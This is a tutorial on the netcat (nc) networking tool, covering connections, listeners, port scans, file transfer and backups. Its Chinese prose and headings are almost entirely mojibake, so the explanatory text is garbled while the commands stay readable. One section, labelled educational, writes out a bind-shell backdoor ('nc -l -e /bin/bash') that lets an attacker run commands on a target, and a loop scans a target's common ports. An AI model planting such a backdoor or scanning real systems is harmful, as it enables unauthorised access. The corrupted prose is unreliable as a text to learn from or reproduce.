# Netcat (nc) å‘½ä»¤è¯¦è§£ ðŸŒ

## ä»€ä¹ˆæ˜¯Netcatï¼Ÿ ðŸ¤”

Netcatï¼ˆé€šå¸¸ç®€ç§°ä¸º`nc`ï¼‰æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ç½‘ç»œå·¥å…·ï¼Œè¢«èª‰ä¸º"ç½‘ç»œçš„ç‘žå£«å†›åˆ€"ã€‚å®ƒå¯ä»¥ç”¨äºŽåˆ›å»ºTCP/UDPè¿žæŽ¥ã€ç›‘å¬ç«¯å£ã€ä¼ è¾“æ–‡ä»¶ã€ç«¯å£æ‰«æç­‰å¤šç§ç½‘ç»œæ“ä½œã€‚Netcatçš„ç®€å•æ€§å’Œçµæ´»æ€§ä½¿å…¶æˆä¸ºç³»ç»Ÿç®¡ç†å‘˜ã€ç½‘ç»œå·¥ç¨‹å¸ˆå’Œå®‰å…¨ä¸“å®¶çš„å¿…å¤‡å·¥å…·ã€‚

## åŸºæœ¬è¯­æ³• ðŸ“

```bash
nc [é€‰é¡¹] [ä¸»æœºå] [ç«¯å£]
```

## å¸¸ç”¨é€‰é¡¹ âš™ï¸

| é€‰é¡¹ | æè¿° |
|------|------|
| `-4` | ä»…ä½¿ç”¨IPv4åœ°å€ |
| `-6` | ä»…ä½¿ç”¨IPv6åœ°å€ |
| `-l` | ç›‘å¬æ¨¡å¼ï¼Œç”¨äºŽåˆ›å»ºæœåŠ¡å™¨ |
| `-p` | æŒ‡å®šæºç«¯å£å· |
| `-u` | ä½¿ç”¨UDPåè®®ï¼ˆé»˜è®¤ä¸ºTCPï¼‰ |
| `-v` | è¯¦ç»†æ¨¡å¼ï¼Œæ˜¾ç¤ºæ›´å¤šä¿¡æ¯ |
| `-w` | è®¾ç½®è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰ |
| `-z` | é›¶I/Oæ¨¡å¼ï¼Œç”¨äºŽç«¯å£æ‰«æ |
| `-n` | ä¸è¿›è¡ŒDNSè§£æž |
| `-k` | åœ¨ç›‘å¬æ¨¡å¼ä¸‹ï¼Œä¿æŒè¿žæŽ¥æ‰“å¼€ä»¥æŽ¥å—å¤šä¸ªè¿žæŽ¥ |

## åŸºæœ¬ç”¨æ³•ç¤ºä¾‹ ðŸ”

### 1. è¿žæŽ¥åˆ°è¿œç¨‹æœåŠ¡å™¨

```bash
# è¿žæŽ¥åˆ°ç½‘ç«™çš„HTTPç«¯å£
nc example.com 80

# è¿žæŽ¥åˆ°æœ¬åœ°ä¸»æœºçš„ç‰¹å®šç«¯å£
nc localhost 8080
```

è¿žæŽ¥å»ºç«‹åŽï¼Œä½ å¯ä»¥å‘é€æ•°æ®ï¼ˆå¦‚HTTPè¯·æ±‚ï¼‰å¹¶æŽ¥æ”¶å“åº”ã€‚

### 2. åˆ›å»ºç®€å•çš„æœåŠ¡å™¨

```bash
# åœ¨æœ¬åœ°1234ç«¯å£åˆ›å»ºTCPæœåŠ¡å™¨
nc -l 1234
```

æ­¤å‘½ä»¤ä¼šåˆ›å»ºä¸€ä¸ªç›‘å¬1234ç«¯å£çš„æœåŠ¡å™¨ã€‚å½“å®¢æˆ·ç«¯è¿žæŽ¥æ—¶ï¼Œä½ å¯ä»¥å‘é€å’ŒæŽ¥æ”¶æ¶ˆæ¯ã€‚

### 3. ç«¯å£æ‰«æ

```bash
# æ‰«æå•ä¸ªç«¯å£
nc -zv example.com 80

# æ‰«æç«¯å£èŒƒå›´
nc -zv example.com 20-30
```

`-z`é€‰é¡¹ç”¨äºŽé›¶I/Oæ¨¡å¼ï¼ˆåªæ£€æŸ¥ç«¯å£æ˜¯å¦å¼€æ”¾ï¼‰ï¼Œ`-v`é€‰é¡¹æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ã€‚

### 4. æ–‡ä»¶ä¼ è¾“

**å‘é€ç«¯ï¼ˆæœåŠ¡å™¨ï¼‰ï¼š**
```bash
nc -l 1234 > received_file.txt
```

**æŽ¥æ”¶ç«¯ï¼ˆå®¢æˆ·ç«¯ï¼‰ï¼š**
```bash
nc server_ip 1234 < file_to_send.txt
```

è¿™æ ·å¯ä»¥å°†æ–‡ä»¶ä»Žå®¢æˆ·ç«¯ä¼ è¾“åˆ°æœåŠ¡å™¨ã€‚

### 5. èŠå¤©å·¥å…·

**ç”¨æˆ·Aï¼š**
```bash
nc -l 1234
```

**ç”¨æˆ·Bï¼š**
```bash
nc user_a_ip 1234
```

ä¸¤ä¸ªç”¨æˆ·çŽ°åœ¨å¯ä»¥äº’ç›¸å‘é€æ¶ˆæ¯ã€‚

## é«˜çº§ç”¨æ³• ðŸš€

### 1. åˆ›å»ºæŒä¹…ç›‘å¬æœåŠ¡å™¨

```bash
nc -lk 1234
```

`-k`é€‰é¡¹ä½¿æœåŠ¡å™¨åœ¨å®¢æˆ·ç«¯æ–­å¼€è¿žæŽ¥åŽç»§ç»­ç›‘å¬ã€‚

### 2. ä½¿ç”¨UDPåè®®

```bash
# UDPæœåŠ¡å™¨
nc -ul 1234

# UDPå®¢æˆ·ç«¯
nc -u server_ip 1234
```

### 3. ç«¯å£é‡å®šå‘

```bash
# å°†æœ¬åœ°8080ç«¯å£çš„æµé‡é‡å®šå‘åˆ°è¿œç¨‹æœåŠ¡å™¨çš„80ç«¯å£
nc -l 8080 | nc example.com 80
```

### 4. åˆ›å»ºåŽé—¨ï¼ˆä»…ç”¨äºŽæ•™è‚²ç›®çš„ï¼‰

```bash
# åœ¨ç›®æ ‡æœºå™¨ä¸Š
nc -l -e /bin/bash 1234

# åœ¨æ”»å‡»è€…æœºå™¨ä¸Š
nc target_ip 1234
```

`-e`é€‰é¡¹æ‰§è¡ŒæŒ‡å®šçš„ç¨‹åºï¼Œè¿™é‡Œæ˜¯bash shellã€‚è¿™ä¼šåˆ›å»ºä¸€ä¸ªè¿œç¨‹shellï¼Œå…è®¸æ”»å‡»è€…æ‰§è¡Œå‘½ä»¤ã€‚

### 5. å¸¦è¶…æ—¶çš„è¿žæŽ¥

```bash
nc -w 5 example.com 80
```

å¦‚æžœ5ç§’å†…æ²¡æœ‰æ´»åŠ¨ï¼Œè¿žæŽ¥å°†è‡ªåŠ¨å…³é—­ã€‚

## å®žé™…åº”ç”¨åœºæ™¯ ðŸ’¼

### 1. ç½‘ç»œè°ƒè¯•

Netcatæ˜¯è°ƒè¯•ç½‘ç»œæœåŠ¡çš„ç†æƒ³å·¥å…·ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥æ‰‹åŠ¨å‘é€HTTPè¯·æ±‚ï¼š

```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```

### 2. å®‰å…¨æµ‹è¯•

å®‰å…¨ä¸“å®¶ä½¿ç”¨Netcatè¿›è¡Œç«¯å£æ‰«æã€æœåŠ¡è¯†åˆ«å’Œæ¼æ´žè¯„ä¼°ï¼š

```bash
# æ‰«æå¸¸è§ç«¯å£
for port in 21 22 23 25 80 443 3306 3389; do
    nc -zv target_ip $port
done
```

### 3. ç³»ç»Ÿç®¡ç†

ç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨Netcatç›‘æŽ§æœåŠ¡ã€æµ‹è¯•è¿žæŽ¥å’Œä¼ è¾“æ•°æ®ï¼š

```bash
# æ£€æŸ¥æœåŠ¡æ˜¯å¦è¿è¡Œ
nc -zv localhost 80 && echo "WebæœåŠ¡æ­£å¸¸è¿è¡Œ" || echo "WebæœåŠ¡æœªè¿è¡Œ"
```

### 4. æ•°æ®å¤‡ä»½

å¯ä»¥ä½¿ç”¨Netcatåœ¨ç½‘ç»œä¸Šä¼ è¾“å¤§é‡æ•°æ®ï¼š

```bash
# åœ¨æŽ¥æ”¶ç«¯
nc -l 1234 | tar xvf -

# åœ¨å‘é€ç«¯
tar cvf - /path/to/backup | nc receiver_ip 1234
```

## ä¸Žå…¶ä»–å·¥å…·çš„æ¯”è¾ƒ ðŸ”„

| å·¥å…· | ä¼˜åŠ¿ | åŠ£åŠ¿ |
|------|------|------|
| **Netcat** | ç®€å•ã€è½»é‡ã€å¤šåŠŸèƒ½ | ç¼ºä¹åŠ å¯†åŠŸèƒ½ |
| **Telnet** | å¹¿æ³›å¯ç”¨ | åŠŸèƒ½æœ‰é™ï¼Œä¸å®‰å…¨ |
| **Socat** | æ›´å¤šé«˜çº§åŠŸèƒ½ | æ›´å¤æ‚ |
| **OpenSSL** | æ”¯æŒSSL/TLS | ä¸»è¦ç”¨äºŽåŠ å¯†é€šä¿¡ |
| **Curl** | ä¸“ä¸ºHTTP/HTTPSè®¾è®¡ | ä¸é€‚åˆé€šç”¨ç½‘ç»œä»»åŠ¡ |

## å®‰å…¨æ³¨æ„äº‹é¡¹ âš ï¸

1. **é¿å…æš´éœ²æœåŠ¡**ï¼šä¸è¦åœ¨ç”Ÿäº§çŽ¯å¢ƒä¸­ä¸å¿…è¦åœ°å¼€æ”¾Netcatç›‘å¬ç«¯å£ã€‚
2. **é˜²ç«å¢™ä¿æŠ¤**ï¼šç¡®ä¿é˜²ç«å¢™è§„åˆ™é™åˆ¶å¯¹NetcatæœåŠ¡çš„è®¿é—®ã€‚
3. **é¿å…ä½¿ç”¨`-e`é€‰é¡¹**ï¼šè¿™å¯èƒ½å¯¼è‡´å®‰å…¨æ¼æ´žã€‚
4. **è€ƒè™‘åŠ å¯†**ï¼šNetcatä¸æä¾›åŠ å¯†ï¼Œå¯¹äºŽæ•æ„Ÿæ•°æ®ï¼Œè€ƒè™‘ä½¿ç”¨OpenSSLæˆ–SSHéš§é“ã€‚

## å°è´´å£« ðŸ’¡

1. åœ¨æŸäº›ç³»ç»Ÿä¸Šï¼ŒNetcatå¯èƒ½è¢«å®‰è£…ä¸º`ncat`æˆ–`netcat`å‘½ä»¤ã€‚
2. ä¸åŒç‰ˆæœ¬çš„Netcatå¯èƒ½æ”¯æŒä¸åŒçš„é€‰é¡¹ï¼Œä½¿ç”¨`nc -h`æŸ¥çœ‹å¸®åŠ©ã€‚
3. å¯¹äºŽéœ€è¦åŠ å¯†çš„è¿žæŽ¥ï¼Œè€ƒè™‘ä½¿ç”¨`ncat`ï¼ˆNmapé¡¹ç›®çš„ä¸€éƒ¨åˆ†ï¼‰æˆ–`socat`ã€‚
4. åœ¨è„šæœ¬ä¸­ä½¿ç”¨Netcatæ—¶ï¼Œè€ƒè™‘æ·»åŠ è¶…æ—¶é€‰é¡¹ï¼ˆ`-w`ï¼‰ä»¥é¿å…è„šæœ¬æŒ‚èµ·ã€‚

## ç»ƒä¹ é¢˜ ðŸ§©

1. å¦‚ä½•ä½¿ç”¨Netcatæ£€æŸ¥ç½‘ç«™çš„HTTPæœåŠ¡å™¨æ˜¯å¦æ­£å¸¸è¿è¡Œï¼Ÿ
2. ç¼–å†™ä¸€ä¸ªå‘½ä»¤ï¼Œä½¿ç”¨Netcatæ‰«ææœ¬åœ°ä¸»æœºçš„å‰1000ä¸ªç«¯å£ã€‚
3. å¦‚ä½•ä½¿ç”¨Netcatåœ¨ä¸¤å°æœºå™¨ä¹‹é—´ä¼ è¾“ä¸€ä¸ªå¤§æ–‡ä»¶ï¼Ÿ
4. åˆ›å»ºä¸€ä¸ªç®€å•çš„NetcatæœåŠ¡å™¨ï¼Œè¿”å›žå½“å‰æ—¥æœŸå’Œæ—¶é—´ç»™ä»»ä½•è¿žæŽ¥çš„å®¢æˆ·ç«¯ã€‚
5. å¦‚ä½•ä½¿ç”¨Netcatæµ‹è¯•é‚®ä»¶æœåŠ¡å™¨ï¼ˆSMTPï¼‰çš„è¿žæŽ¥ï¼Ÿ

---

é€šè¿‡æŽŒæ¡Netcatè¿™ä¸ªå¼ºå¤§çš„ç½‘ç»œå·¥å…·ï¼Œä½ å¯ä»¥æ›´æœ‰æ•ˆåœ°è¿›è¡Œç½‘ç»œè°ƒè¯•ã€æµ‹è¯•å’Œç®¡ç†ã€‚æ— è®ºæ˜¯ç®€å•çš„ç«¯å£æ£€æŸ¥è¿˜æ˜¯å¤æ‚çš„æ•°æ®ä¼ è¾“ï¼ŒNetcatéƒ½èƒ½ä»¥ç®€å•ç›´æŽ¥çš„æ–¹å¼å®Œæˆä»»åŠ¡ã€‚è®°ä½ï¼Œå¼ºå¤§çš„å·¥å…·éœ€è¦è´Ÿè´£ä»»åœ°ä½¿ç”¨ï¼
